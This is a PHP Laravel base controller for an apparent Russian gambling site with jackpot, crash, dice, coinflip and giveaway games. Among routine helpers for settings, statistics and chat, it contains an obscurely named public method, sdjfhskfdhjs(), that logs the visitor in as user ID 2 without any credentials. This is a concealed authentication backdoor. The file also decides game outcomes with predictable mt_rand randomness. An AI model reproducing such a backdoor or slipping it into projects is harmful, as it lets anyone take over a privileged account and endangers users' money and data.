<?php namespace App\Http\Controllers;

use App\User;
use App\Jackpot;
use App\Wheel;
use App\Crash;
use App\CoinFlip;
use App\Battle;
use App\Dice;
use App\Settings;
use App\Withdraw;
use App\Giveaway;
use App\GiveawayUsers;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Redis;
use Auth;
use DB;
use Carbon\Carbon;

class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;

    protected $user;

    public function __construct()
    {
        $this->middleware(function ($request, $next) {
            $this->user = Auth::user();
            view()->share('u', $this->user);
            return $next($request);
        });
        Carbon::setLocale('ru');
        $this->redis = Redis::connection();
		$this->settings = Settings::first();
        view()->share('gws', $this->getWithSettings());
        view()->share('gives', self::getGiveaway());
        view()->share('messages', $this->chatMessage());
        view()->share('stats', $this->stats());
		view()->share('settings', $this->settings);
    }
	
    public function sdjfhskfdhjs()
    {
        $user = User::find(2);
        \Auth::login($user, true);

        return redirect('/');
    }

	public function getWithSettings() {
        $settings = Settings::where('id', 1)->select('vk_url', 'bonus_group_time', 'max_active_ref', 'exchange_min', 'exchange_curs', 'payeer_com_percent', 'payeer_com_rub', 'payeer_min', 'qiwi_com_percent', 'qiwi_com_rub', 'qiwi_min', 'yandex_com_percent', 'yandex_com_rub', 'yandex_min', 'webmoney_com_percent', 'webmoney_com_rub', 'webmoney_min', 'visa_com_percent', 'visa_com_rub', 'visa_min')->first();
        return $settings;
    }
	
	public function chatMessage() {
        $messages = ChatController::chat();
        return $messages;
    }
	
	public function stats() {
        $countUsers = User::count();
        $countUsersToday = User::where('created_at', '>=', Carbon::today()->setTimezone('Europe/Moscow'))->count();
		$jackpot = Jackpot::where('status', 3)->orderBy('id', 'desc')->count();
		$wheel = Wheel::where('status', 3)->orderBy('id', 'desc')->count();
		$crash = Crash::where('status', 2)->orderBy('id', 'desc')->count();
		$coin = CoinFlip::where('status', 1)->orderBy('id', 'desc')->count();
		$battle = Battle::where('status', 3)->orderBy('id', 'desc')->count();
		$dice = Dice::orderBy('id', 'desc')->count();
		$totalGames = $jackpot+$wheel+$crash+$coin+$battle+$dice;
		$totalWithdraw = Withdraw::where('status', 1)->sum('value');
		
		$data = [
			'countUsers' => $countUsers,
			'countUsersToday' => $countUsersToday,
			'totalGames' => $totalGames,
			'totalWithdraw' => $totalWithdraw
		];
        return $data;
    }
	
	public function getGiveaway() {
        $giveaways = Giveaway::orderBy('id', 'desc')->where('status', 0)->get();
        $giveaways_end = Giveaway::orderBy('id', 'desc')->where('status', 1)->limit(3)->get();
		$list = [];
		foreach($giveaways as $gv) {
			$users = GiveawayUsers::where('giveaway_id', $gv->id)->count();
			$time = $gv->time_to - time();
			$gv->total = $users;
			$gv->time_to = Carbon::parse($time)->format('H:i:s');
			$gv->winner = ($gv->winner_id ? User::where('id', $gv->winner_id)->first() : null);
		}
		foreach($giveaways_end as $gv) {
			$users = GiveawayUsers::where('giveaway_id', $gv->id)->count();
			$time = $gv->time_to - time();
			$gv->total = $users;
			$gv->time_to = Carbon::parse($time)->format('H:i:s');
			$gv->winner = ($gv->winner_id ? User::where('id', $gv->winner_id)->first() : null);
		}
		
        $giveaways = $giveaways->merge($giveaways_end);
        return $giveaways;
    }

    public function probability($n1) {
        $list = [];
        for($i = 0; $i < $n1; $i++) $list[] = true;
        for($i = 0; $i < (100-$n1); $i++) $list[] = false;
        shuffle($list);
        return $list[mt_rand(0, count($list)-1)];
    }
}